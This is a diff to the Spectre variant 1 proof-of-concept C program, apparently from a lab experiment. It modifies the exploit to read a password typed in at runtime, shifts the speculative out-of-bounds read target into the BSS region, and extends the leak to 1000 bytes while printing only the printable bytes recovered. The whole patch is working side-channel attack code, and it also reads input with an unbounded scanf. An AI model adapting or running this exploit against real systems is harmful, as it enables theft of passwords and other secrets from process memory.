@@ -40,6 +40,13 @@
 #define NOCLFLUSH
 #endif
 
+// inited gose to data, uninited gose to bss
+enum Mode {DATA = 0, BSS = 1};
+enum Mode mode = BSS;
+#define BSS_OFFSET 140000
+
+char ui[256];
+
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -66,7 +73,7 @@ uint8_t array1[16] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char * secret = "The Magic Words are Squeamish Ossifrage.";
+char * secret = "The quick brown fox jumps over the lazy dog";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
@@ -288,10 +295,18 @@ int main(int argc,
   int cache_hit_threshold = 80;
 
   /* Default for malicious_x is the secret string address */
+  size_t malicious_ui = (size_t)(ui - (char * ) array1);
   size_t malicious_x = (size_t)(secret - (char * ) array1);
+  //printf("base is %ld\n",malicious_x);
+  //printf("ui   is %ld\n",malicious_ui);
+  malicious_x += (mode == BSS ? BSS_OFFSET : 0);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
-  int len = 40;
+  int len = 1000;
+
+  printf ("Enter your password: ");
+  scanf ("%s", ui);
+
   
   int score[2];
   uint8_t value[2];
@@ -366,7 +381,6 @@ int main(int argc,
 
   /* Start the read loop to read each address */
   while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
 
     /* Call readMemoryByte with the required cache hit threshold and
        malicious x address. value and score are arrays that are
@@ -374,17 +388,19 @@ int main(int argc,
     */
     readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
 
-    /* Display the results */
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    
-    if (score[1] > 0) {
-      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+    if (value[0] > 31 && value[0] < 127) {
+      /* Display the results */
+      printf("Reading at malicious_x = %p... ", (void * ) (malicious_x - 1));
+      printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+      printf("0x%02X=’%c’ score=%d ", value[0],
+        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+      
+      if (score[1] > 0) {
+        printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
+        (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+      }
+      printf("\n");
     }
-
-    printf("\n");
   }
   return (0);
 }
